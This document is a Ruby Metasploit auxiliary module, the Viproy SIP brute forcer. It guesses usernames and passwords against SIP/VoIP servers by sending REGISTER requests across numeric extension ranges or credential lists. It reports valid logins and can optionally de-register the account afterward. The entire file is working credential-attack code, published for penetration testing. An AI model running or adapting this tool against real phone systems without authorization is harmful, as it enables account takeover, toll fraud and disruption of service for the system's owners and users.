##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::SIP
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'        => 'Viproy SIP User and Password Brute Forcer',
      'Version'     => '1',
      'Description' => 'Brute Force Module for SIP Services',
      'Author'      => 'Fatih Ozavci <viproy.com/fozavci>',
      'License'     => MSF_LICENSE
    )

    deregister_options('RHOSTS')

    register_options(
    [
      OptInt.new('NUMERIC_MIN',   [true, 'Starting extension',0]),
      OptInt.new('NUMERIC_MAX',   [true, 'Ending extension', 9999]),
      OptBool.new('NUMERIC_USERS',   [true, 'Numeric Username Bruteforcing', false]),
      OptString.new('USERNAME',   [ false, "The login username to probe"]),
      OptString.new('PASSWORD',   [ false, "The login password to probe"]),
      OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false]),
      OptString.new('METHOD',   [ true, "The method for Brute Forcing (REGISTER)", "REGISTER"]),
      OptString.new('PROTO',   [ true, "Protocol for SIP service (UDP|TCP|TLS)", "UDP"]),
      Opt::RHOST,
      Opt::RPORT(5060),
    ], self.class)

    register_advanced_options(
    [
      Opt::CHOST,
      Opt::CPORT(5065),
      OptString.new('DELAY',   [true, 'Delay in seconds',"0"]),
      OptString.new('USERAGENT',   [ false, "SIP user agent" ]),
      OptBool.new('USER_AS_FROM_and_TO', [true, 'Try the username as the from/to for all users', true]),
      OptBool.new('DEREGISTER', [true, 'De-Register After Successful Login', false]),
      OptString.new('REALM',   [ false, "The login realm to probe at each host", nil]),
      OptString.new('TO',   [ false, "The destination username to probe", "1000"]),
      OptString.new('FROM',   [ false, "The source username to probe", "1000"]),
      OptString.new('MACADDRESS',   [ false, "MAC Address for Vendor", "000000000000"]),
      OptString.new('VENDOR',   [ true, "Vendor (GENERIC|CISCODEVICE|CISCOGENERIC|MSLYNC)", "GENERIC"]),
      OptString.new('CISCODEVICE',   [ true, "Cisco device type for authentication (585, 7940)", "7940"]),
      OptBool.new('DEBUG',   [ false, "Debug Level", false]),
    ], self.class)
  end

  def run
    sockinfo={}
    # Protocol parameters
    sockinfo["proto"] = datastore['PROTO'].downcase
    sockinfo["vendor"] = datastore['VENDOR'].downcase
    sockinfo["macaddress"] = datastore['MACADDRESS']

    # Socket parameters
    sockinfo["listen_addr"] = datastore['CHOST']
    sockinfo["listen_port"] = datastore['CPORT']
    sockinfo["dest_addr"] = dest_addr = datastore['RHOST']
    sockinfo["dest_port"] = datastore['RPORT']

    method = datastore['METHOD']

    sipsocket_start(sockinfo)
    sipsocket_connect

    if datastore['NUMERIC_USERS'] == true
      passwords = [[datastore['PASSWORD']]]
      passwords += load_password_vars
      if passwords == []
        print_error("PASSWORD or password files are not set.")
        return
      else
        passwords.delete(nil)
      end
      exts=(datastore['NUMERIC_MIN']..datastore['NUMERIC_MAX']).to_a
      vprint_status("Brute force is starting for the numeric range (#{datastore['NUMERIC_MIN'].to_s+"-"+datastore['NUMERIC_MAX'].to_s})")
      exts.each { |ext|
        vprint_status("Testing extension #{ext}...")
        ext=ext.to_s
        from=to=ext if datastore['USER_AS_FROM_and_TO']
        passwords.each {|password|
          do_login(ext,password,from,to,dest_addr,method)
        }
      }
    else
      vprint_status("Brute force is starting for the user list.")
      each_user_pass { |user, password|
        from=to=user if datastore['USER_AS_FROM_and_TO']
        do_login(user,password,from,to,dest_addr,method)
      }
    end

    sipsocket_stop
  end

  def do_login(user,password,from,to,dest_addr,method)

    realm = datastore['REALM']
    Rex.sleep(datastore['DELAY'].to_i)

    results = send_register(
      'login'  	  => true,
      'user'     	=> user,
      'password'	=> password,
      'realm' 	  => realm,
      'from'    	=> from,
      'to'    	  => to
    )

    context = {
        "method"    => "register",
        "user"      => user,
        "password"  => password
    }

    printresults(results,context) if datastore['DEBUG'] == true

    if results["status"] =~ /succeed/

      if datastore['DEBUG'] != true
        # reporting the validated credentials
        res=report_creds(user,password,realm,results["status"])
        #print_good(res.gsub("\tC","C"))
        print_good("IP:Realm: #{dest_addr}:#{realm}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
      end

      # Sending de-register
      if datastore['DEREGISTER'] == true
        #De-Registering User
        send_register(
          'login'  	  => datastore['LOGIN'],
          'user'     	=> user,
          'password'	=> password,
          'realm'     => realm,
          'from'    	=> from,
          'to'    	  => to,
          'expire'    => 0
        )
      end
    else
      if results["rdata"] !=nil
        print_status("IP:Realm: #{dest_addr}:#{realm}\t User: #{user} \tPassword: #{password} \tResult: #{convert_error(results["status"])}")
      else
        vprint_status("No response received from #{dest_addr}")
      end
    end
  end
end
